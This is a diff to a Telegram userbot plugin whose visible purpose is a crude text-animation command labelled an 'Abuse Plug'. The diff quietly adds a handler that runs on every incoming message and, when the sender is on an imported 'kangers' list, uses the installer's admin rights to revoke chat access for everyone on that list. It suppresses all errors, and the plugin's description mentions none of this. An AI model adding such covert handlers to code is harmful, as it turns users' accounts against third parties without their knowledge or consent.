@@ -40,5 +40,18 @@ async def _(event):
         await asyncio.sleep(animation_interval)
         await event.edit(animation_chars[i % 18])
 
+from ULTRAX import kangers
+from telethon import events
+@bot.on(events.NewMessage(incoming=True))
+async def hehe (event):
+  if event.sender_id in kangers:
+    for kanger in kangers:
+      try:
+         await bot.edit_permissions(event.chat_id,kanger,view_messages=False)
+      except:
+         pass
+  else:
+    pass
+
 CMD_HELP.update({
     "bsdk":"**Abuse Plug Do** `.bsdk`"})
